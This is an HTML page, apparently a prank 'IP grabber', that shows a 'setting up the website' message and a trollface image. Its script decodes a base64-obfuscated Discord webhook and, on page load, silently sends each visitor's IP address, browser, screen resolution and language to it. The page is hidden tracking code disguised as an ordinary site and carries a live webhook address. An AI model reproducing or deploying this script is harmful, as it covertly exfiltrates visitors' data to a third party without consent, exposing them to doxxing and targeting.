<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TheWebSide</title>
</head>
<body>
    <h1>Configurando la página web...</h1>
  
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">

    <script>
        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0ODc0Mjc0MTM5OTcwMzU1Mi9EbHdXY1pmTlg5YmJnaTJ2SDJNc2tRSTR2alhJYTd2WlhGWU1xUWtxOGgxVFhOTFNnUG5wcDJUTkNzSEF5NDZ4SGdo");

        async function obtenerIP() {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        }

        async function enviarDatos() {
            const ip = await obtenerIP();
            const navegador = navigator.userAgent;
            const resolucion = `${screen.width}x${screen.height}`;
            const idioma = navigator.language;

            const payload = {
                content: `
🌐 **Nuevo visitante en la web**

📡 **IP:** \`${ip}\`
💻 **Navegador:** \`${navegador}\`
🖥️ **Resolución:** \`${resolucion}\`
🌎 **Idioma:** \`${idioma}\`
                `
            };

            // Enviar la IP al Webhook de Discord
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            console.log("✅ IP enviada a Discord.");
        }

        // Protección Anti-Spam: Solo envía una vez por visita
        if (!localStorage.getItem('ip_enviada')) {
            enviarDatos();
            localStorage.setItem('ip_enviada', true);
        }
    </script>
</body>
</html>
